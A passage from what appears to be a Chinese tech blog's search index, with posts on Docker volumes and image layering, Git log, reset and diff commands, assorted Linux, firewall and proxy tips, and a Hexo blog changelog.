创建Dockerfile文件，并添加以下文件内容# vi ~/dockerfileFROM centosVOLUME ["/dataVolume1","//dataVolume2"]CMD /bin/bash# 通过dockerfile文件构建新的Docker镜像，peter是命名空间，centos7是新镜像的名称# docker build -f ~/dockerfile -t peter/centos7 .# 查看刚构建的Docker镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/centos7 latest e6d3ad991247 50 seconds ago 202MB# 基于刚构建的Docker镜像，新建并启动容器# docker run -it --name="centos7" peter/centos7# 查看容器内通过dockerfile添加的容器卷# ls -al /drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume1drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume2# 查看宿主机中数据卷的挂载目录，该挂载目录由Docker分配# docker inspect centos7"Mounts": [ { "Type": "volume", "Name": "b6c0574c8e2105ebb736857f050d106dd4d3b35617c40110b69d85c22c900de1", "Source": "/var/lib/docker/volumes/b6c0574c8e2105ebb736857f050d106dd4d3b35617c40110b69d85c22c900de1/_data", "Destination": "/dataVolume2", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" }, { "Type": "volume", "Name": "0ad49fc76fc6af73ebc62efc88c3976cb44edd1b48aed3d26995e7759044972a", "Source": "/var/lib/docker/volumes/0ad49fc76fc6af73ebc62efc88c3976cb44edd1b48aed3d26995e7759044972a/_data", "Destination": "/dataVolume1", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" }] Docker 数据卷容器的使用 容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止；即便是初始的数据卷容器或中间层的数据卷容器删除了，只要还有其他的容器使用数据卷，那么里面的数据都不会丢失。 12345678910111213141516171819# 首先创建Dockerfile文件# vi ~/dockerfileFROM centosVOLUME ["/dataVolume1","/dataVolume2"]CMD /bin/bash# 通过Dockerfile文件构建新的Docker镜像# docker build -f ~/dockerfile -t peter/centos7 .# 基于刚构建的Docker镜像，新建并启动容器# docker run -it --name="centos-1" peter/centos7# 基于上面的centos-1容器，再创建另一个容器centos-2，同时指定centos-1容器作为数据卷容器# docker run -it --name="centos-2" --volumes-from centos-1 peter/centos7# 查看centos-2容器内的容器卷# ls -al /drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume1drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之四 Docker 镜像结构与加载原理",url:"/posts/eb291124.html",text:'Docker 镜像 镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，包含运行某个软件所需的所有内容，其中包括代码、运行时、库、环境变量、配置文件。 Docker 的 Base 镜像 Base 镜像从 scratch 构建，不依赖其他镜像，可作为其他应用镜像的父镜像；其他应用镜像可以在此基础进行扩展，Base 镜像通常都是各种 Linux 发行版的 Docker 镜像，比如 Ubuntu、Debian、CentOS 等。 Docker 镜像加载原理 bootfs 在 Docker 镜像中最底层是 bootfs (boot file sysem) 文件系统，bootfs 主要包含 bootloader 和 kernel。Linux 刚启动时会加载 bootfs 文件系统，bootlader 主要作用是引导加载 kernel。在 Docker 镜像中，bootfs 这一层与典型的 Linux/Unix 系统是一样的，包含 bootloader 和 kernel。当 bootloader 加载完成之后整个内核都存放在内存中，此时内存的使用权已由 bootfs 转交给内核，此时系统也会卸载 bootfs。 rootfs 在 Docker 镜像中用户空间的文件系统是 rootfs，包含 /dev、/proc、/bin 等目录。对于 base 镜像来说，底层直接用 Host 的 kernel，自己只需要提供 rootfs。而对于一个精简的 OS，rootfs 的体积可以很小，只需要包含最基本的命令、工具和程序库就可以。 不同 Linux 发行版的主要区别就是 rootfs。比如 Ubuntu14.04 使用 upstart 管理服务，apt 管理软件包；而 CentOS7 使用 systemd 和 yum。这些都是用户空间上的区别，Linux kernel 差别不大。因此 Docker 可以同时支持多种发行版的 Linux 镜像，模拟出多种操作系统环境。 容器只能使用 Host 的 kernel，并且不能修改。所有容器都共用 host 的 kernel，在容器中没办法对 kernel 升级。如果容器对 kernel 版本有要求（比如应用只能在某个 kernel 版本下运行），则不建议用容器，这种场景虚拟机可能更合适。 图解 bootfs、rootfs UnionFS 文件系统 一种为 Linux，FreeBSD 和 NetBSD 操作系统设计的把其他文件系统联合到一个联合挂载点的文件系统服务。它使用 branch 把不同文件系统的文件和目录 “透明地” 覆盖，形成一个单一一致的文件系统。这些 branches 或者是 read-only 或者是 read-write 的，所以当对这个虚拟后的联合文件系统进行写操作的时候，系统是真正写到了一个新的文件中。看起来这个虚拟后的联合文件系统是可以对任何文件进行操作的，但是其实它并没有改变原来的文件，这是因为 unionfs 用到了一个重要的资管管理技术叫写时复制。写时复制（copy-on-write）技术，也叫隐式共享，是一种对可修改资源实现高效复制的资源管理技术。它的思想是，如果一个资源是重复的，但没有任何修改，这时候并不需要立即创建一个新的资源；这个资源可以被新旧实例共享。创建新资源发生在第一次写操作，也就是对资源进行修改的时候。通过这种资源共享的方式，可以显著地减少未修改资源复制带来的消耗，但是也会在进行资源修改的时候增加小部分的开销。 Docker 镜像中的 UnionFS UnionFS 文件系统是 Docker 镜像的基础，镜像可以通过分层来进行继承，基于 Base 镜像（没有父镜像），可以制作各种具体的应用镜像。简单概括来说，UnionFS 是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层地叠加，同时可以将不同目录挂载到同一个虚拟文件系统下。特性是可以一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统；联合加载会把各层文件系统叠加起来，这样最终的文件系统包含所有底层的文件和目录。 容器的可写层 当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作 “容器层”，“容器层” 之下的都叫 “镜像层”。所有对容器的改动，无论添加、删除、还是修改文件都只会发生在容器层中。即只有容器层是可写的，容器层下面的所有镜像层都是只读的。其中镜像层数量可能会很多，所有镜像层会联合在一起组成一个统一的文件系统（UnionFS）。如果不同镜像层中有一个相同路径的文件，比如 /a，上层的 /a 会覆盖下层的 /a，也就是说用户只能访问到最上层中的文件 /a。在容器层中，用户看到的是一个叠加之后的文件系统。下图是容器可写层的图解： 容器可写层的操作 添加文件，在容器中创建文件时，新文件被添加到容器层中。 读取文件，在容器中读取某个文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，打开并读入内存。 修改文件，在容器中修改已存在的文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后再修改。 删除文件，在容器中删除文件时，Docker 也是从上往下依次在镜像层中查找此文件。找到后，会在容器层中记录下此删除操作。 上面的操作中，只有当需要修改时才复制一份数据，这种特性被称作写时复制（copy-on-write）。可见容器层保存的是镜像变化的部分，不会对镜像本身进行任何修改。容器层记录对镜像的修改，所有镜像层都是只读的，不会被容器修改，所以镜像可以被多个容器共享。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Git 之二 - 显示日志、恢复文件、比较文件",url:"/posts/d8e8dbb.html",text:'Git 显示提交的日志信息（本地库）1234567891011121314151617181920212223242526272829303132# 查看所有分支的所有操作的日志信息(包括commit和reset的操作)，一般用于数据恢复$ git reflog# 显示每条提交日志信息的详细内容$ git log# 显示每条提交日志信息的详细内容，包括reflog的日志信息$ git log -g# 显示每条提交日志信息更详细的内容$ git log --pretty=raw# 将每条提交日志信息输出为一行显示$ git log --pretty=oneline# 将每条提交日志信息的摘要内容输出为一行显示$ git log --oneline# 将每条提交日志信息的摘要内容输出为一行显示，并指定显示多少条日志$ git log --oneline -2# 指定从第几条日志信息开始显示，例如从第三条日志信息开始显示$ git log --skip 2# 显示每条提交日志信息的详细内容，包含每次提交对应的文件操作类型（增删改）$ git log --name-status# 显示每条提交日志信息的详细内容，包含文件详细的改动记录$ git log -p# 绘制提交的线索图$ git log --graph Git 搜索提交的日志信息（本地库）12345678# 匹配签名信息（例如：“peter@gmail.com”）中的任意内容，搜索某人提交的所有日志信息$ git log --author peter# 根据提交时填写的备注信息，搜索提交的日志信息$ git log --grep keywords# 搜索某个文件的所有改动记录，参数是文件完整的相对路径或者绝对路径$ git log -p -- config/my.config Git 恢复到某个提交的历史版本（本地库）此操作适用于文件的删除或修改操作 commit 之后，想找回已删除的文件，或者将文件还原到修改前的某个历史版本，成功的前提是被删除或者被修改的文件必须曾经 commit 到本地库 12345678910111213141516171819202122232425262728# 查看所有分支的所有操作的日志信息(包括commit和reset的操作)，一般用于数据恢复$ git reflog4630fa3 HEAD@{0}: commit: update message346f528 HEAD@{1}: commit: update messageb86daaa HEAD@{2}: commit: update messagefdbbf3c HEAD@{3}: commit: update message775a0c5 HEAD@{4}: commit: update message42a3d41 HEAD@{5}: commit: update message81f4118 HEAD@{6}: commit: update message0c05880 HEAD@{7}: commit: update message670e552 HEAD@{8}: commit (initial): update message# 基于索引值恢复到指定历史版本（推荐），可以随意往前往后恢复$ git reset --hard 346f528# 基于^符号恢复（只能往后恢复），当同时使用N个^符号时，表示顺序往后恢复N个版本$ git reset --hard HEAD^# 基于~符号恢复（只能往后恢复），数字N表示顺序往后恢复N个版本$ git reset --hard HEAD~1# 恢复到当前本地库中HEAD指针指向的历史版本，一般指的就是HEAD@{0}$ git reset --hard HEAD# reset操作的定义域（必须明确指定，否则可能造成数据不可恢复的丢失）$ git reset --soft 只在本地库移动HEAD指针，暂存区和工作区都不会受影响$ git reset --mixed 默认选项，在本地库移动HEAD指针，暂存区同步到指定的提交，工作区不受影响$ git reset --hard 在本地库移动HEAD指针，暂存区和工作区都同步到指定的提交，强烈建议预先执行一次commit操作，否则可能造成数据不可恢复的丢失 Git 将某个文件回滚到指定版本在使用 Git 时，可能会遇到这种问题：一次 commit 了多个文件，但是提交后发现有一个文件不应该被提交，如果把整个 commit 回滚会很麻烦（因为正确提交的文件也会被回滚），这时就需要单独回滚某个文件，具体操作如下： 12345678# 首先找到特定文件要回滚的版本的hash值$ git log api.json# 利用hash值回滚特定文件（可以直接使用hash值的前六位）$ git checkout 2d1ed0 api.json# 提交回滚后的文件$ git commit -m api.json Git 比较文件差异（本地库）12345678910# 将工作区的文件与暂存区的文件进行比较$ git diff api.json# 将工作区的文件和本地库中HEAD指针指向的历史版本的文件进行比较$ git diff HEAD api.json# 将工作区的文件和本地库上一个历史版本的文件进行比较$ git diff HEAD^ api.json# 注意：当“git diff”命令不指定文件名参数，则代表比较工作区的所有文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制"},{title:"日常编程开发技巧之一",url:"/posts/533ecd67.html",text:'Linux 发行版 12345Arch系：ArchLinux/Antergos/ManjaroRedhat系：CentOS/Fedora/Mageia/openSUSEDebian系：Debian/Ubuntu/Kali/Kubuntu/LinuxMint/Deepin/UbuntuKylinLinux排行榜与Linux实时资讯站点：https://distrowatch.com/ Google 搜索引擎指定搜索的语言范围 12345678默认： 全球各种语言的搜索结果英文： &amp;lr=lang_en日文： &amp;lr=lang_ja中文： &amp;lr=lang_zh-CN中文（含台湾）： &amp;lr=lang_zh-CN%7Clang_zh-TW举例只搜索中文相关的Java内容：https://www.google.com/search?lr=lang_zh-CN&amp;q=Java SSH 客户端通过 Socker5 代理连接到 Linux 目标服务器 12# 下面Socker5代理服务器的IP和端口是127.0.0.1和1080，Linux目标服务器的IP/域名是192.168.1.1，其中Socker5代理服务可以是SS/SSR、Tor...$ ssh -o ProxyCommand=\'nc -x 127.0.0.1:1080 %h %p\' root@192.168.1.1 Linux 解压文件 1234567891011121314151617181920212223242526# 解压.rar后缀的文件$ unrar x xxx.rar# 解压.rar后缀的文件，若文件存在则直接覆盖$ unrar x -o+ xxx.rar# 指定目录深度，解压目录下的所有RAR文件$ find -maxdepth 1 -name \'*.rar\' | xargs -i unrar x {}# 解决unzip解压文件后，出现中文文件名乱码的问题$ unzip -O CP936 xxx.zip# 通过upzip解压文件到指定的目录，前提是指定的目录必须存在$ unzip -d /usr/local gradle-5.4.1-bin.zip# 指定目录深度，解压目录下的所有ZIP文件$ find -maxdepth 1 -name "*.zip" | xargs -i unzip -O CP936 {}# 指定解压目录，前提是指定的目录必须存在$ tar -xvf apache-maven-2.6.tar.gz -C /home/www/apache-maven-2.6# 解压.7z后缀的文件（不保持目录结构）$ 7za e data.7z# 解压.7z后缀的文件（保持目录结构）$ 7za x data.7z Linux 强制删除查找到的文件 12345# 强制删除当前目录下文件名以downloading结尾的所有文件$ find . -name "*downloading" | xargs rm -rf# 或者使用-I指定一个替换字符串{}，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次$ find . -name "*downloading" | xargs -I {} rm -rf {} Linux 文件统计 1234567891011121314# 统计当前目录下文件（指定后缀）的总个数$ find . -name "*.html" | wc -l# 统计当前目录下每个文件（指定后缀）的总行数$ find . -name "*.html" | xargs wc -l# 统计当前目录下每个文件（指定后缀）的总字数$ find . -name "*.html" | xargs wc -w# 统计当前目录下每个文件（指定后缀）的总字节数$ find . -name "*.html" | xargs wc -c# 不加任何参数的wc会统计文件的总行数、总字数、总字节数$ find . -name "*.html" | xargs wc 解决 Linux 的 tree 命令不能正确显示中文的问题 12# 添加-N参数$ tree -N Linux 校验文件的哈希值 123456789101112131415# 基于MD5加密算法，获取文件的哈希值$ md5sum tomcat8.tar.gz# 或者将待校验文件的正确MD5哈希值写入到指定的文件，然后通过“md5sum -c”命令输出MD5哈希值比对的结果$ vim tomcat8.md583aca9b98564ba4064aa0acad7360ceb tomcat8.tar.gz# 输出文件的MD5校验结果$ md5sum -c tomcat8.md5tomcat8.tar.gz: OK# 基于SHA1加密算法，获取文件的哈希值$ sha1sum tomcat8.tar.gz# 同上，也可以使用“sha1sum -c”命令进行SHA1哈希值的比对 Git 强制更新并覆盖本地仓库与工作区的文件，即本地强制同步远程仓库的所有文件 1$ git fetch --all &amp;&amp; git reset --hard origin/master &amp;&amp; git pull PM2 服务相关操作命令 1234567891011121314# 启动某个应用$ sudo pm2 start api_server# 关闭某个应用$ sudo pm2 stop api_server# 查看某个应用的运行状态$ sudo pm2 show api_server# 启用PM2开机自启动$ sudo systemctl enable pm2-root# 禁用PM2开机自启动$ sudo systemctl disable pm2-root Centos7 防火墙配置 123456789101112131415161718192021222324252627282930# 切换至Root用户$ su - root# 查看防火墙运行状态# firewall-cmd --state# 查看防火墙运行状态# systemctl status firewalld# 关闭防火墙# systemctl stop firewalld# 启用防火墙# systemctl start firewalld# 配置防火墙永久开放某个端口# firewall-cmd --zone=public --permanent --add-port=8080/tcp# firewall-cmd --zone=public --permanent --add-port=8080/udp# 配置防火墙关闭开放某个端口# firewall-cmd --zone=public --permanent --remove-port=8000/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports# 查看防火墙已开放的服务# firewall-cmd --list-services 查看 Linux 系统的发行版本 12345678910# 以下方法中，至少有一种方法适用于Redhat、SuSE、Debian系的Linux发行版# 方法一（在不同Linux发行版中，lsb_release命令不一定都存在）$ lsb_release -a# 方法二（xxx为发行版名称，例如os-release、centos-release）$ cat /etc/xxx-release# 方法三$ cat /etc/issue Linux 查看端口占用的情况 12345# 查看端口占用，且显示进程ID（推荐）# netstat -anp|grep 80# 或者（不显示进程ID）# netstat -aon|grep 80 Debian/Ubuntu 防火墙配置 12345678910111213141516171819202122232425# 查看防火墙现有规则# ufw status# 开启防火墙# ufw enable# 关闭防火墙# ufw disable# 开放指定的tcp、udp端口# ufw allow 22/tcp# ufw allow 22/udp# 同时开放tcp与udp端口# ufw allow 22# 删除开放22端口的规则# ufw delete allow 22# 拒绝指定的tcp、udp端口# allow/deny 20/tcp# allow/deny 20/udp# 保存防火墙配置# ufw reload Git 设置代理 1234# 下面的http://127.0.0.1:8118是代理服务器的访问地址，也可以是本地代理工具的访问地址$ git config --global http.proxy http://127.0.0.1:8118$ git config --global https.proxy http://127.0.0.1:8118$ git config --global http.sslverify false YUM 设置代理 12345678910111213141516# 方法一# vim /etc/yum.confproxy=http://127.0.0.1:8118# 方法二# 临时添加环境变量# export http_proxy=http://127.0.0.1:8118# export https_proxy=http://127.0.0.1:8118# 测试代理# curl -I www.google.com# 移除环境变量# unset http_proxy# unset https_proxy Eclipse 常用快捷键 12345678910111213141516171819202122alt + /：代码补全ctrl + d：删除当前行ctrl + h：打开搜索界面ctrl + w：关闭当前Tab页crtl + t：显示类的继承关系ctrl + f：当前查找/当前替换ctrl + shift + x：转换为大写ctrl + shift + y：转换为小写crtl + q：返回到最近编辑的地方ctrl + shift + f：格式化代码ctrl + o：查看当前类的属性、方法ctrl + l：定位到当前文件的某一行ctrl + shift + o：快速生成导入包ctrl + o：查看当前类所有的方法、属性ctrl + f1：快速显示错误代码的Fix方案alt + shift + r：重命名方法名、属性名f3：快速定位光标位置的某个类、方法、属性ctrl + shift + w：关闭打开的所有Tab页ctrl + shift + g：查找类、方法、属性被引用的情况alt + shift + w：快速定位当前文件所在项目中的路径ctrl + shift + t：全局查找Java类文件，可以使用通配符ctrl + shift + r：全局查找文件（包括Java类文件），可以使用通配符 IntelliJ IDEA 常用快捷键 123456789101112131415161718192021222324alt + /：代码补全ctrl + f：当前查找ctrl + x：删除当前行ctrl + f4：关闭当前Tab页crtl + h：显示类的继承关系alt + shift + f：收藏代码ctrl + r：当前查找/当前替换ctrl + alt + l：格式化代码ctrl + shift + u：大小写转换ctrl + e：查看最近打开过的文件ctrl + alt + o：快速生成导入包alt + left：返回到上一个编辑的页面alt + right：进入到下一个编辑的页面ctrl + shift + v：选择要粘贴的内容crtl + shift + r：全局查找/全局替换alt + enter：万能解错/生成返回值变量ctrl + alt + h：查看方法被引用的情况shift + f6：更改文件名、方法名、属性名ctrl + f12：查看当前类所有的方法、属性ctrl + alt + u：在当前Tab页显示类的继承结构图ctrl + shift+i --&gt; ctrl + enter：查看Java源码ctrl + shift + ”+/-”：展开全部代码、折叠全部代码ctrl + alt + shift + u：在新的Tab页显示类的继承结构图ctrl + n：全局搜索普通文件与Java类文件，若需要搜粟包括Jar包里面的内容，需要勾选“include non-project classes”选项 Centos7 重启 IBUS 输入法 1# ibus-daemon -r -d -x Centos7 时间同步 1234567891011121314151617181920212223242526272829303132# 由于Centos7默认使用chronyd来同步时间，如果需要安装其他时间同步服务（ntpd），则需要禁用chronyd# systemctl disable chronyd# 安装ntp服务# yum install ntp# 使用ntp手动同步时间# ntpdate pool.ntp.org# 开机启动ntp服务# systemctl enable ntpd# 启动ntp服务# systemctl start ntpd# 重启ntp服务# systemctl restart ntpd# 查看ntp服务的运行状态# systemctl status ntpd# 设置亚洲时区# timedatectl set-timezone Asia/Shanghai# 启用ntp同步# timedatectl set-ntp yes# 查看当前系统时间、时间同步状态# timedatectl status# 查看时间同步服务器列表# ntpq -p JVM 设置代理 1234567# 不支持Socket代理，只支持Http代理-Dhttp.proxyPort=8118-Dhttp.proxyHost=127.0.0.1-Dhttps.proxyPort=8118-Dhttps.proxyHost=127.0.0.1-Dhttp.nonProxyHosts="localhost|127.0.0.1|*.aliyun.com" Centos7 调节屏幕亮度 12345# 安装xgamma# yum install xgamma# 调节调度，其中 0.1 &lt; n &lt; 10.0# xgamma -gamma n 解决 Centos 的 Qt 桌面应用程序无法正常运行的问题 123456789101112131415# 具体表现为应用的界面无法正常显示（白屏 + 界面过度拉伸），一般是Qt对高DPI显示器的配置出了问题# 添加环境变量# vim /etc/profileexport QT_AUTO_SCREEN_SCALE_FACTOR=0# 使环境变量生效# source /etc/profile# 如果应用是在ZSH Shell环境下使用命令启动，则需要在ZSH的配置文件中添加环境变量（区分不同的Linux用户）# vim ~/.zshrcexport QT_AUTO_SCREEN_SCALE_FACTOR=0# 使ZSH配置文件生效（区分不同的Linux用户）# source ~/.zshrc Centos7 的应用快捷方式指定环境变量 1234567891011121314151617181920212223242526272829# 配置示例，在快捷方式文件里指定环境变量：QT_AUTO_SCREEN_SCALE_FACTOR=0# 方法一[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=env QT_AUTO_SCREEN_SCALE_FACTOR=0 /snap/bin/redis-desktop-manager.rdm %UTerminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# 方法二[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=bash -c "export QT_AUTO_SCREEN_SCALE_FACTOR=0 &amp;&amp; /usr/bin/vlc --started-from-file %U"Terminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# 参考博客# https://askubuntu.com/questions/144968/set-variable-in-desktop-file# https://askubuntu.com/questions/542152/desktop-file-with-bashrc-environment Centos7 的应用快捷方式使用 Root 权限启动 123456789101112# 以下方法使用了gksu-polkit，目前存在无法通过UI界面关闭应用的Bug（即点击界面上的关闭按钮，应用进程不会被杀死）[Desktop Entry]Version=4.6.2Encoding = UTF-8Type=ApplicationName=eclipse-neonIcon=/usr/local/eclipse-neon/icon.xpmExec=gksu-polkit /usr/local/eclipse-neon/eclipseComment=JEE IDECategories=Development;IDE;Terminal=false Centos7 快捷方式的位置 123456# 全局的应用程序快捷方式/usr/share/applications//usr/local/share/applications/# 特定用户的应用程序快捷方式~/.local/share/applications/ Linux 磁盘分区的空间不足 1234567891. 可以尝试使用Gparted等工具进行分区扩容，但不建议这么做，因为容易破坏硬盘的分区表，导致数据丢失或者造成系统无法正常启动。2. 建议将分区内（磁盘空间不足）体积较大的目录移动到其他分区（磁盘空间充足），然后在分区内（磁盘空间不足）创建软链接或者使用"mount --bind"的方法，指向新目录所在的路径。3. 假设其他分区也没有充足的磁盘空间，那么此时应该新增硬盘并挂载到系统中，然后通过上面介绍的方法将分区内（磁盘空间不足）体积较大的目录移动到新硬盘的分区即可。提示：1) 切记并非所有应用都支持创建软链接（ln -s）的方法，因为创建软链接后有可能会导致部分应用无法正常运行（例如snapd），建议统一使用"mount --bind"2) 假设通过Gparted工具进行分区扩容，扩容之后系统可以正常启动，磁盘分区的容量也确实增加了，但这一切都不能说明扩容操作真的成功了。因为这类操作可能会留下其他后患，例如扩容后使用"再生龙"备份硬盘为镜像文件时，会出现“无法保存分区”的错误信息。 Docker 配置代理 1234567891011121314151617# 此方法适用于Debian/Ubuntu/CentOS系统，修改配置后会持续生效，其中的配置将覆盖docker.service中的选项# 创建存放配置文件的目录# mkdir -p /etc/systemd/system/docker.service.d# 新增代理配置文件# vim /etc/systemd/system/docker.service.d/http-proxy.conf[Service]Environment="HTTP_PROXY=http://192.168.1.122:1080" "HTTPS_PROXY=http://192.168.1.122:1080" "NO_PROXY=localhost,127.0.0.1,mirrors.aliyun.com"# 重载配置# systemctl daemon-reload# 重启Docker服务# systemctl restart docker# 若取消代理，只需删除代理配置文件，并重载配置和重启Docker服务即可 CURL 命令使用 1234567891011121314# 跳过Https证书验证（-k）# curl -k https://example.com# 允许跟随重定向（-L）# curl -I -L http://example.com# 指定请求方式（-X）# curl -X GET http://example.com# 指定用户名密码（-u，注意密码会记录在Bash的历史记录中）# curl -u username:password http://example.com# 指定来源（--referer）# curl -v -I --referer http://source.com htttp://example.com var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发随笔"},{title:"Hexo 博客搭建日志",url:"/posts/fc2b1bbb.html",text:'2018-12-20（截止） 实现博客加密限制访问 基于谷歌、百度的 SEO 优化 添加 404 页面、博客版权声明 博客使用唯一的短字符串作为链接地址（URL） 显示站点的总访问量、每篇博客的阅读量统计与字数统计 基于 Linux + Gitolite + GitHooks + Shell 脚本自主实现 Hexo 的持续部署与博客备份 . . . . . . 2018-12-28 显示站点的总运行时间 添加 PDF 文件在线显示插件 Web 服务器配置跨域、GZIP 压缩、Web 静态资源的浏览器端缓存 2019-01-28 添加代码块折叠插件 2019-02-11 PC 端的页面新增 APlayer 音乐播放器 添加 hexo-generator-sitemap 插件（更改源码），使生成的站点地图忽略 JSON 文件的 URL 卸载官方的 hexo-generator-index 插件，添加 hexo-generator-index2 插件（更改源码），实现首页隐藏指定文章 2019-02-24 添加 Google Analytics 的统计代码 完善谷歌的 SEO 优化（整合重复网址、规范网页） 添加 hexo-autonofollow 插件（更改源码），为博客中的外链自动加上 nofollow 属性 2019-03-03 整理 Hexo 的插件依赖，将以前更改过代码的开源插件和自主开发的插件统一打包为自定义插件，并发布到 NPM 仓库，自定义插件列表如下： ★展开自定义插件列表一★ 12345678910111213hexo-readmorehexo-ssl-authhexo-site-authhexo-yilia-foldhexo-pdf-betterhexo-waline-nexthexo-pangu-betterhexo-next-darkmodehexo-google-adsensehexo-tipue-search-dbhexo-admonition-betterhexo-lazyload-image-betterhexo-generator-sogou-sitemap ★展开自定义插件列表二★ 1234567hexo-toc-customizedhexo-dplayer-customizedhexo-blog-encrypt-customizedhexo-autonofollow-customizedhexo-generator-index2-customizedhexo-generator-sitemap-customizedhexo-generator-json-content-customized 2019-03-05 404 页面改版 使用 Gulp 自定义脚本压缩 CSS、JS、HTML、图片文件，并将 Gulp 压缩集成到 Hexo 的持续部署流程中 更改 Hexo 主题 Yilia 的源码，并通过 Webpack 重新构建编译，实现有序的标签列表、优化主题的显示细节 2019-03-13 将 Web 服务器部署到 Docker 容器内 Web 服务迁移至 Tencent Cloud，更换站点域名 添加 DPlayer 视频播放插件（更改源码），默认支持播放的视频格式包括：mp4、flv、m3u8 2019-03-19 实现全站 HTTPS 化 完成站点页面改造，全面接入百度熊掌 ID 完成站点备案，并在站点的页面底部添加备案号 2019-03-20 添加网页加载进度条 添加显示文章目录的插件（hexo-toc-customized） 2019-09-28 基于 Utterance 新增博客评论功能 2019-09-30 接入微信公众号的 JS-SDK，实现微信分享博客链接时显示缩略图片的功能 2020-01-04 优化移动端的页面，文章详情页面不再显示发布日期、字数统计、阅读量统计 在博客主题的模板中新增谷歌广告代码，广告的固定位置分别是页面左侧的菜单栏（适用于 PC 端）、每篇文章的底部（适用于 PC 端 + 移动端） 新增 Hexo 谷歌广告插件（hexo-google-adsense），支持使用 Hexo 自定义标签在指定的文章中任何地方动态插入谷歌广告代码（适用于 PC 端 + 移动端） 2020-01-08 新增 RSS 订阅功能 基于搜狗搜索引擎的 SEO 优化 新增自动生成搜狗站点地图的 Hexo 插件（hexo-generator-sogou-sitemap） 2020-01-14 PC 端新增站内全文静态搜索功能 添加图片懒加载插件（hexo-lazyload-image-better） 2020-03-28 基于必应搜索引擎的 SEO 优化 2020-04-15 实现 Hexo 的多线部署，使用 Coding Pages、GitHub Pages 来加快国内外访问博客的速度 2021-01-25 基于自定义插件（hexo-pangu-customized），在 HTML 文件里的中文字符和英文字符之间自动添加空格符（MarkDown 代码块除外） 基于自定义插件（hexo-generator-json-content-customized），支持在 Yilia 主题的搜索工具里使用标题来搜索博客时，默认不再隐藏已加密的博客（Posts） 2021-04-12 升级 Gulp 的版本至 4.0.2 升级 Hexo 的版本至 5.4.0 取消 Coding Pages 的多线部署 将博客默认的主题迁移至 NexT，同时保留并兼容旧主题 Yilia 在 NexT 主题的基础上，基于 Docker 新增 Waline 评论系统的前后端支持 2021-04-29 基于自定义插件（hexo-next-darkmode），新增可切换的暗黑模式 2021-06-12 基于自定义插件（hexo-waline-next），支持 Waline 客户端将评论图片上传到七牛图床 2022-01-17 基于自定义插件（hexo-readmore），让用户扫码关注微信公众号后才可以解锁文章 2022-02-24 全站禁用 CDN 资源（仅限于 JS、CSS 资源），统一使用站内的 Web 资源文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": 